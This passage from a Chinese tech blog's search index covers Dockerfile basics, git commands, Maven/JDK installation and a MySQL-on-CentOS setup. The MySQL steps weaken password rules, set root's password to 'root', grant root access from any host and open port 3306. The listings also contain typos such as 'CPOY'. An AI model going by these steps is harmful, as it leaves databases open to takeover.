class=\"headerlink\" title=\"DockerFile\"></a>DockerFile</h3><h4 id=\"什么是DockerFile-？\"><a href=\"#什么是DockerFile-？\" class=\"headerlink\" title=\"什么是DockerFile ？\"></a>什么是 DockerFile ？</h4><p>dockerfile 是用来构建 docker 镜像的文件！命令参数脚本！</p>\n<p><strong>构建步骤</strong>：</p>\n<ol>\n<li>编写一个 dockerfile 文件</li>\n<li> docker build 构建成为一个镜像</li>\n<li> docker run 运行镜像</li>\n<li> docker push 发布镜像（DockerHub、阿里云镜像仓库！）</li>\n</ol>\n<h4 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h4><ol>\n<li>每个保留关键字（指令）都是必须是大写字母</li>\n<li>执行从上到下顺序执行</li>\n<li>‘#’ 表示注释</li>\n<li>每一个指令都会创建提交一个新的镜像层，并提交！</li>\n</ol>\n<p>dockerfile 是面向开发的，我们以后要发布项目，做镜像，就需要编写 dockerfile 文件，这个文件十分简单！</p>\n<p>DockerFile：构建文件，定义了一切的步骤，源代码。<br>Dockerlmages：通过 DockerFile 构建生成的镜像，最终发布和运行的产品。<br>Docker 容器：容器就是镜像运行起来提供服务的。</p>\n<h4 id=\"DockerFile的命令\"><a href=\"#DockerFile的命令\" class=\"headerlink\" title=\"DockerFile的命令\"></a>DockerFile 的命令</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">FROM         # 基础镜像，一起从这里开始构建</span><br><span class=\"line\">MAINTAINER   # 镜像作者：姓名-邮箱</span><br><span class=\"line\">RUN          # 镜像构建的时候需要运行的命令</span><br><span class=\"line\">ADD          # 步骤：tomcat镜像，这个tomcat压缩包！添加内容</span><br><span class=\"line\">WORKDIR      # 镜像的工作目录</span><br><span class=\"line\">VOLUME       # 挂载的目录</span><br><span class=\"line\">EXPOSE       # 暴露端口配置</span><br><span class=\"line\">CMD          # 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class=\"line\">ENTRYPOINT   # 指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class=\"line\">ONBUILD      # 当构建一个被继承DockerFile 这个时候就会运行ONBUILD 的指令，触发指令。</span><br><span class=\"line\">CPOY         # 类似ADD，将我们的文件拷贝到镜像中</span><br><span class=\"line\">ENV          # 构建的时候设置环境变量！</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h4><ol>\n<li>编写 dockerfile 的文件 </li>\n</ol>\n<figure class=\"highlight dockerfile\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> centos:latest</span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> batye&lt;<span class=\"number\">1175715363</span>@qq.com&gt;</span><br><span class=\"line\"><span class=\"keyword\">ENV</span> MYPATH /usr/local</span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> <span class=\"variable\">$MYPATH</span></span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> yum -y install vim</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> yum -y install net-tools</span></span><br><span class=\"line\">EXPOST <span class=\"number\">8001</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> <span class=\"built_in\">echo</span> <span class=\"variable\">$MYPATH</span></span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> <span class=\"built_in\">echo</span> <span class=\"string\">\"----end----\"</span></span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> /bin/bash</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>构建文件镜像 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker build -f dockerFile_test -t vim.centos:0.0.1 .</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>原生 contos7</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# docker run -it centos</span><br><span class=\"line\">[root@566d6bd3f48d /]# pwd</span><br><span class=\"line\">/</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工作目录为根目录</span></span><br><span class=\"line\">[root@566d6bd3f48d /]# vim</span><br><span class=\"line\">bash: vim: command not found</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">没有vim 工具</span></span><br><span class=\"line\">[root@566d6bd3f48d /]# exit</span><br><span class=\"line\">exit</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>vim.centos 增加配置以后的镜像 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# docker run -it vim.centos:0.0.1</span><br><span class=\"line\">[root@53bfee4c6557 local]# pwd</span><br><span class=\"line\">/usr/local</span><br><span class=\"line\">[root@53bfee4c6557 local]# vim</span><br><span class=\"line\"></span><br><span class=\"line\">[root@53bfee4c6557 local]# ifconfig</span><br><span class=\"line\">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 172.17.0.5  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class=\"line\">        ether 02:42:ac:11:00:05  txqueuelen 0  (Ethernet)</span><br><span class=\"line\">        RX packets 8  bytes 656 (656.0 B)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">[root@53bfee4c6557 local]# exit</span><br><span class=\"line\">exit</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>列出本地进行的变更历史 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker history 692aba72d901</span><br></pre></td></tr></tbody></table></figure>\n\n<p><img data-src=\"https://pic.imgdb.cn/item/6545f262c458853aef77e132.jpg\" alt=\"docker history 692aba72d901\"></p>\n<ol start=\"6\">\n<li>CMD 和 ENTRYPOINT 区别 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">CMD            # 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class=\"line\">ENTRYPOINT     # 指定这个容器启动的时候要运行的命令，可以追加命令</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li><p>测试 CMD</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">1. 编写dockerfile文件</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# vim dockerfile-cmd-test</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# cat dockerfile-cmd-test</span><br><span class=\"line\">FROM centos:7</span><br><span class=\"line\">CMD [\"ls\",\"-a\"]</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">2. 构建镜像</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# docker build -f dockerfile-cmd-test -t cmdtest .</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">3. run运行，发现我们的<span class=\"string\">\"ls -a\"</span>命令生效、执行</span></span><br><span class=\"line\">docker run 06f2cc65ea4a</span><br></pre></td></tr></tbody></table></figure>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run 06f2cc65ea4a </span><br></pre></td></tr></tbody></table></figure>\n<p>  <img data-src=\"https://pic.imgdb.cn/item/6545f420c458853aef7e35a4.jpg\" alt=\"docker run 06f2cc65ea4a \"></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">4. 我们先追加一个命令<span class=\"string\">\"l\"</span>,构成<span class=\"string\">\"ls -al\"</span>命令，发现报错</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# docker run ec0d2dd226b3 -l</span><br><span class=\"line\">docker: Error response from daemon: failed to create task for container: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: exec: \"-l\": executable file not found in $PATH: unknown.</span><br><span class=\"line\">ERRO[0000] error waiting for container:</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">原因：CMD命令的情况下，<span class=\"string\">\"-l\"</span>替换了CMD[<span class=\"string\">\"1s\"</span>，<span class=\"string\">\"-a\"</span>]命令，因为<span class=\"string\">\"-l\"</span>不是命令，所以报错！</span></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>测试 ENTRYPOINT</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">1. 编写dockerfile文件</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# vim dockerfile-entrypoint-test</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# cat dockerfile-entrypoint-test</span><br><span class=\"line\">FROM centos:7</span><br><span class=\"line\">ENTRYPOINT [\"ls\",\"-a\"]</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">2. 构建镜像</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ dockerfile]# docker build -f dockerfile-entrypoint-test -t entrypointtest .</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">3. run运行，发现我们的<span class=\"string\">\"ls -a\"</span>命令生效、执行</span></span><br><span class=\"line\">docker run 5184c7d459a0</span><br></pre></td></tr></tbody></table></figure>\n<p><img data-src=\"https://pic.imgdb.cn/item/6545fc1bc458853aef99f91e.jpg\" alt=\"docker run 5184c7d459a0\"></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run 5184c7d459a0 -l</span><br></pre></td></tr></tbody></table></figure>\n<p><img data-src=\"https://pic.imgdb.cn/item/6545fb94c458853aef982c74.jpg\" alt=\"docker run 5184c7d459a0 -l\"></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">原因：ENTRYPOINT命令的情况下，<span class=\"string\">\"-l\"</span>追加在ENTRYPOINT [<span class=\"string\">\"1s\"</span>，<span class=\"string\">\"-a\"</span>]命令后面，得到<span class=\"string\">\"ls -al\"</span>的命令，所以命令正常执行！</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">（我们的追加命令，是直接拼接在我们的ENTRYPOINT命令的后面）</span></span><br></pre></td></tr></tbody></table></figure></li>\n</ul>\n","categories":["linux","docker"],"tags":["前端","linux","docker"]},{"title":"linux 配置缩写快捷操作","url":"//linux/config/git-config.html","content":"<p>编辑～/.zshrc 增加自定义配置</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">alias gps=\"git push origin\"</span><br><span class=\"line\">alias gcm=\"git add . &amp;&amp; git commit -m \"</span><br><span class=\"line\">alias gpl=\"git pull origin\"</span><br><span class=\"line\">alias gco=\"git checkout\"</span><br></pre></td></tr></tbody></table></figure>\n","categories":["linux","git"],"tags":["前端","linux","Git"]},{"title":"Git 使用","url":"//linux/config/git.html","content":"<p>Git 是一个分布式版本控制系统，用于跟踪文件的变化并协作开发。以下是使用 Git 的基本步骤：</p>\n<ol>\n<li><p>安装 Git：首先，你需要在本地计算机上安装 Git。你可以从 Git 官方网站（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXQtc2NtLmNvbS8lRUYlQkMlODklRTQlQjglOEIlRTglQkQlQkQlRTUlQjklQjYlRTYlOEMlODklRTclODUlQTclRTUlQUUlODklRTglQTMlODUlRTYlOEMlODclRTUlOEQlOTclRTglQkYlOUIlRTglQTElOEMlRTUlQUUlODklRTglQTMlODUlRTMlODAlODI=\">https://git-scm.com/）下载并按照安装指南进行安装。<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n<li><p>创建一个 Git 仓库：进入你的项目文件夹，并使用以下命令初始化一个新的 Git 仓库：</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git init</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>添加文件到暂存区：将需要进行版本控制的文件添加到 Git 的暂存区，使用以下命令：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git add &lt;文件名&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>提交文件：将暂存区的文件提交到 Git 仓库，使用以下命令：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git commit -m \"提交说明\"</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>分支管理：</li>\n</ol>\n<p>Git 使用分支来管理不同的版本和功能。可以使用以下命令创建、切换、合并、暂存、还原暂存分支：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git branch          &lt;分支名&gt;        # 创建新分支</span><br><span class=\"line\">git checkout        &lt;分支名&gt;        # 切换到分支</span><br><span class=\"line\">git checkout -b     &lt;分支名&gt;        # 基于当前分支创建分支</span><br><span class=\"line\">git merge           &lt;分支名&gt;        # 合并分支</span><br><span class=\"line\">git branch                         # 查看分支列表</span><br><span class=\"line\">git stash    save   ''             # 暂存分支</span><br><span class=\"line\">git stash    pop                   # 恢复暂存：</span><br><span class=\"line\">                                   # 恢复暂存的修改 这个指令将缓存堆栈中的第一个stash删除，并将对应修改应用到当前的工作目录下。</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"6\">\n<li>远程仓库：Git 还提供了远程仓库的功能，可以将本地仓库与远程仓库进行同步和协作。常用的远程仓库服务有 GitHub、GitLab 和 Bitbucket。可以使用以下命令与远程仓库进行交互：</li>\n</ol>\n<ul>\n<li>添加远程仓库：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git remote add origin &lt;远程仓库地址&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>将本地分支推送到远程仓库：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git push -u origin &lt;分支名&gt;</span><br></pre></td></tr></tbody></table></figure>\n<ul>\n<li>将本地代码强制推送到远程仓库：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git push -f || -force origin &lt;分支名&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>从远程仓库拉取最新代码：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git pull origin &lt;分支名&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这些是 Git 的基本用法，还有更多高级的用法和命令可以根据实际需要进行学习和掌握。你可以参考 Git 的官方文档或查找其他教程来深入了解 Git 的更多功能和用法。</p>\n<ol start=\"7\">\n<li>回退版本</li>\n</ol>\n<p>git reset 命令用于回退版本，可以指定退回某一次提交的版本。git reset 命令语法格式如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git reset [--soft | --mixed | --hard] [HEAD]</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>–mixed</li>\n</ul>\n<p>为默认，可以不用带该参数，用于重置暂存区的文件与上一次的提交 (commit) 保持一致，工作区文件内容保持不变。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git reset HEAD^                  # 回退所有内容到上一个版本</span><br><span class=\"line\">git reset HEAD^ git_use.md       # 回退文件的版本到上一个版本</span><br><span class=\"line\">git reset 0123adsfe3             # 回退到指定版本</span><br></pre></td></tr></tbody></table></figure>\n\n\n<ul>\n<li>–hard</li>\n</ul>\n<p>参数撤销工作区中所有未提交的修改内容，将暂存区与工作区都回到上一次版本，并删除之前的所有信息提交：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git reset --hard HEAD             # 回退所有内容到上一个版本</span><br><span class=\"line\">git reset --hard HEAD~3           # 回退上上上一个版本</span><br><span class=\"line\">git reset –hard bae128            # 回退到某个版本回退点之前的所有信息</span><br><span class=\"line\">git reset --hard origin/master    # 将本地的状态回退到和远程的一样</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"8\">\n<li>删除本地和远程分支 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git branch  -d         &lt;分支名&gt;    # 删除本地</span><br><span class=\"line\">git push    origin -d  &lt;分支名&gt;    # 删除远程分支</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"9\">\n<li>配置全局用户信息 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name   \"batype\"</span><br><span class=\"line\">git config --global user.email  1175715363@qq.com</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"10\">\n<li>避免每次推送都输入密码 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git config --global credential.helper store</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"11\">\n<li>当前 Git 仓库关联的远程仓库的 URL 配置 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git remote add     origin &lt;url&gt; # 添加 origin 地址</span><br><span class=\"line\">git remote set-url origin &lt;url&gt; # 更新 origin 地址</span><br><span class=\"line\">git remote get-url origin       # 获取 origin 地址</span><br><span class=\"line\">git remote remove  origin       # 移除 origin 地址</span><br></pre></td></tr></tbody></table></figure>\n\n","categories":["linux","git"],"tags":["前端","linux","Git"]},{"title":"ubantu 安装 Maven 和 jdk 步骤","url":"//linux/install/maven/jdk.html","content":"<p>To install Maven and JDK (Java Development Kit) on Ubuntu, you can follow these steps:</p>\n<p>Open a terminal on your Ubuntu system.</p>\n<p>Update the package lists by running the following command:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br></pre></td></tr></tbody></table></figure>\n\n<p>Install Maven by running the following command:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install maven</span><br></pre></td></tr></tbody></table></figure>\n\n<p>This will install Maven and its dependencies.</p>\n<p>Verify the installation by running the following command:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">mvn --version</span><br></pre></td></tr></tbody></table></figure>\n\n<p>This should display the version of Maven installed on your system.</p>\n<p>Install JDK (Java Development Kit) using the following steps:</p>\n<p>a. Check if Java is already installed on your system by running the following command:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">yum list installed | grep java</span><br><span class=\"line\">或者</span><br><span class=\"line\">java -version</span><br></pre></td></tr></tbody></table></figure>\n\n<p>If Java is not installed, you will see an error message.</p>\n<p>b. select yum list package version</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">yum search java | grep -i --color jdk</span><br></pre></td></tr></tbody></table></figure>\n\n<p>c. Install the default JDK package by running the following command:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">yum install java-1.8.0-openjdk.x86_64</span><br><span class=\"line\">or</span><br><span class=\"line\">sudo apt install default-jdk</span><br></pre></td></tr></tbody></table></figure>\n\n<p>This will install the default JDK package available in the Ubuntu package repository.</p>\n<p>d. Verify the installation by running the following command:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">javac -version</span><br></pre></td></tr></tbody></table></figure>\n\n<p>This should display the version of the JDK installed on your system.</p>\n<p>Additionally, you can also run the following command to check the Java Runtime Environment (JRE) version:</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">java -version</span><br></pre></td></tr></tbody></table></figure>\n\n<p>This will display the JRE version.</p>\n<p>e. jdk checkout version link</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/java 1</span><br><span class=\"line\">sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/javac 1</span><br></pre></td></tr></tbody></table></figure>\n\n<p>f. use shell checkout version</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo update-alternatives --config java</span><br><span class=\"line\">有 3 个候选项可用于替换 java (提供 /usr/bin/java)。</span><br><span class=\"line\"></span><br><span class=\"line\">选择       路径                                          优先级  状态</span><br><span class=\"line\">------------------------------------------------------------</span><br><span class=\"line\">* 0            /usr/lib/jvm/java-17-openjdk-amd64/bin/java      1711      自动模式</span><br><span class=\"line\">1            /usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/java   1         手动模式</span><br><span class=\"line\">2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java      1711      手动模式</span><br><span class=\"line\">3            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      手动模式</span><br><span class=\"line\"></span><br><span class=\"line\">要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：1</span><br></pre></td></tr></tbody></table></figure>\n\n\n<p>That’s it! You have now installed Maven and JDK on your Ubuntu system. You can use Maven for building projects and the JDK for developing and running Java applications.</p>\n","categories":["linux","maven"],"tags":["前端","linux","maven","jdk"]},{"title":"MySQL linux install","url":"//linux/install/MySQL.html","content":"<p>在线下载 mysql 安装包</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">wget https://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></tbody></table></figure>\n\n<p>安装 MySQL</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></tbody></table></figure>\n\n<p>安装 MySQL 服务器</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">yum -y install mysql-community-server</span><br></pre></td></tr></tbody></table></figure>\n\n<p>报错 失败的软件包是： mysql-community-libs-compat-5.7.37-1.el7.x86_64<br>GPG 密钥配置为： file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>解决办法：原因是 Mysql 的 GPG 升级了，需要重新获取<br>使用以下命令即可</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br></pre></td></tr></tbody></table></figure>\n\n<p>重新执行</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">yum -y install mysql-community-server</span><br></pre></td></tr></tbody></table></figure>\n\n<p>安装完毕<br>启动 Mysql 服务</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">systemctl start  mysqld.service</span><br></pre></td></tr></tbody></table></figure>\n\n<p>修改 mysql 的密码<br>查看 MySQL 临时密码</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">grep \"password\" /var/log/mysqld.log</span><br></pre></td></tr></tbody></table></figure>\n\n\n<p>使用临时密码先登录</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">mysql -u root -p</span><br></pre></td></tr></tbody></table></figure>\n\n<p>注意：密码设置必须要大小写字母数字和特殊符号（,/‘;: 等）, 不然不能配置成功<br>查看 mysql 默认密码复杂度</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">SHOW VARIABLES LIKE 'validate_password%';</span><br></pre></td></tr></tbody></table></figure>\n\n<p>把 MySQL 的密码校验强度改为低风险</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">set global validate_password_policy=LOW;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>修改 MySQL 的密码长度</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">set global validate_password_length=4;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>修改密码为 root</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">ALTER USER 'root'@'localhost' IDENTIFIED BY 'root';</span><br></pre></td></tr></tbody></table></figure>\n\n<p>开启 mysql 远程访问</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>1、使用 grant 命令</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">grant all privileges on 数据库名.表名 to 创建的用户名(root)@\"%\" identified by \"密码\";</span><br></pre></td></tr></tbody></table></figure>\n\n<p>2、格式说明：<br>数据库名。表名 如果写成 *.* 代表授权所有的数据库<br>@ 后面是访问 mysql 的客户端 IP 地址（或是 主机名） % 代表任意的客户端，如果填写 localhost 为本地访问（那此用户就不能远程访问该 mysql 数据库了）</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">flush privileges; //刷新权限</span><br></pre></td></tr></tbody></table></figure>\n\n<p>退出 mysql</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">exit;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>为 firewalld 添加开放端口</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">firewall-cmd --zone=public --add-port=3306/tcp --permanent  //开放端口</span><br><span class=\"line\">firewall-cmd --reload  //重新加载防火墙</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其他配置<br>关闭 MySQL</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">systemctl stop mysqld</span><br></pre></td></tr></tbody></table></figure>\n\n<p>重启 MySQL</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure>\n\n<p>查看 MySQL 运行状态</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">systemctl status mysqld</span><br></pre></td></tr></tbody></table></figure>\n\n<p>设置开机启动</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">systemctl enable mysqld</span><br></pre></td></tr></tbody></table></figure>\n\n<p>关闭开机启动</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">systemctl disable mysqld</span><br></pre></td></tr></tbody></table></figure>\n\n<p>配置默认编码为 utf8</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">vi /etc/my.cnf</span><br><span class=\"line\">在[mysqld]中加入 character_set_server=utf8 </span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>区分大小写</p>\n<p>/etc/my.cof</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">lower_case_table_names=1</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其他默认配置文件路径：<br>配置文件： /etc/my.cnf<br>日志文件： /var/log/mysqld.log<br>服务启动脚本： /usr/lib/systemd/system/mysqld.service</p>\n","categories":["linux","mysql"],"tags":["linux","mysql"]},{"title":"CentOS 上安装 Nginx","url":"//linux/install/nginx.html","content":"<p>要在 CentOS 上安装 Nginx，您可以按照以下步骤进行操作：</p>\n<p>打开终端或 SSH 连接到 CentOS 服务器。</p>\n<p>确保您的系统已经更新到最新版本。运行以下命令更新软件包：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo yum update</span><br></pre></td></tr></tbody></table></figure>\n\n<p>安装 Nginx。运行以下命令进行安装：</p>\n<figure 